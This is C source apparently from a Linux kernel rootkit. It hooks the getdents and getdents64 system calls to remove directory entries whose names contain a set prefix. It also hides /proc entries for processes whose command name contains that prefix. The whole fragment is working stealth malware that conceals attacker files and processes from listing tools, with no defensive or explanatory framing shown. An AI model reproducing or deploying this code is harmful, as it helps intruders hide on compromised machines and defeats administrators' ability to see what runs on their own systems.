/* Returns 1 if the /proc/<pid> entry should be hidden (comm contains prefix). */
static int should_hide_proc_pid(const char *pid_str)
{
	struct pid *pid_struct;
	struct task_struct *task;
	char comm[TASK_COMM_LEN];
	unsigned long pid_nr;
	int hide = 0;

	if (kstrtoul(pid_str, 10, &pid_nr) != 0)
		return 0;

	rcu_read_lock();
	pid_struct = find_vpid(pid_nr);
	if (!pid_struct)
		goto out;

	task = pid_task(pid_struct, PIDTYPE_PID);
	if (!task)
		goto out;

	get_task_comm(comm, task);
	if (strstr(comm, BDS_PREFIX))
		hide = 1;

out:
	rcu_read_unlock();
	return hide;
}

static asmlinkage int bds_getdents64(const struct pt_regs *pt_regs) {
	int fd = (int) pt_regs->di;
	struct linux_dirent * dirent = (struct linux_dirent *) pt_regs->si;
	int ret = orig_getdents64(pt_regs);
	int err;
	unsigned short proc = 0;
	unsigned long off = 0;
	struct linux_dirent64 *dir, *kdirent, *prev = NULL;
	struct inode *d_inode;

	if (ret <= 0)
		return ret;
	kdirent = kzalloc(ret, GFP_KERNEL);
	if (kdirent == NULL)
		return ret;
	err = copy_from_user(kdirent, dirent, ret);
	if (err)
		goto out;
	d_inode = current->files->fdt->fd[fd]->f_path.dentry->d_inode;
	if (d_inode->i_ino == PROC_ROOT_INO && !MAJOR(d_inode->i_rdev))
		proc = 1;

	while (off < ret) {
		dir = (void *)kdirent + off;

		if ((!proc && strstr(dir->d_name, BDS_PREFIX)) ||
		    (proc && should_hide_proc_pid(dir->d_name))) {
			if (dir == kdirent) {
				ret -= dir->d_reclen;
				memmove(dir, (void *)dir + dir->d_reclen, ret);
				continue;
			}
			prev->d_reclen += dir->d_reclen;
		} else
			prev = dir;
		off += dir->d_reclen;
	}
	err = copy_to_user(dirent, kdirent, ret);
	if (err)
		goto out;
out:
	kfree(kdirent);
	return ret;
}

static asmlinkage int bds_getdents(const struct pt_regs *pt_regs) {
	int fd = (int) pt_regs->di;
	struct linux_dirent * dirent = (struct linux_dirent *) pt_regs->si;
	int ret = orig_getdents(pt_regs);
	int err;
	unsigned short proc = 0;
	unsigned long off = 0;
	struct linux_dirent *dir, *kdirent, *prev = NULL;
	struct inode *d_inode;

	if (ret <= 0)
		return ret;
	kdirent = kzalloc(ret, GFP_KERNEL);
	if (kdirent == NULL)
		return ret;
	err = copy_from_user(kdirent, dirent, ret);
	if (err)
		goto out;
	d_inode = current->files->fdt->fd[fd]->f_path.dentry->d_inode;
	if (d_inode->i_ino == PROC_ROOT_INO && !MAJOR(d_inode->i_rdev))
		proc = 1;

	while (off < ret) {
		dir = (void *)kdirent + off;

		if ((!proc && strstr(dir->d_name, BDS_PREFIX)) ||
		    (proc && should_hide_proc_pid(dir->d_name))) {
			if (dir == kdirent) {
				ret -= dir->d_reclen;
				memmove(dir, (void *)dir + dir->d_reclen, ret);
				continue;
			}
			prev->d_reclen += dir->d_reclen;
		} else
			prev = dir;
		off += dir->d_reclen;
	}
	err = copy_to_user(dirent, kdirent, ret);
	if (err)
		goto out;
out:
	kfree(kdirent);
	return ret;
}